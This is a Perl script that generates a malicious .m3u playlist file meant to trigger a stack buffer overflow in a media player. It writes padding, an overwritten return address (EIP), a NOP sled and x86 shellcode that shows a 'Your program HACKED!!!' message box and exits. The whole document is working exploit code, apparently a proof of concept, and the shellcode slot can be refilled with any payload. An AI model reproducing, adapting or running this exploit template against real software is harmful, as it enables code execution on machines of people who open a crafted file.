my $file = "AttackMsgBox32.m3u";
my $junk = "\x41" x 0x108;
my $eip  = "\x0C\x26\x1D\x0F";
my $shellcode = "\x90" x 4; # 0x90 = NOP
$shellcode = $shellcode.
"\x6A\x10".
"\x6A\x00".
"\x8D\x44\x24\x28".
"\x50".
"\x6A\x00".
"\xFF\x15\x9C\x91\x41\x00".
"\x6A\x01".
"\xFF\x15\xA8\x90\x41\x00"; 
my $junk2 = "\x90" x 3;
my $mesg = "Your program HACKED!!!\x00\x00";
open($FILE, ">$file");
print $FILE $junk.$eip.$shellcode.$junk2.$mesg;
close($FILE);
print "m3u File Created Successfully \n";



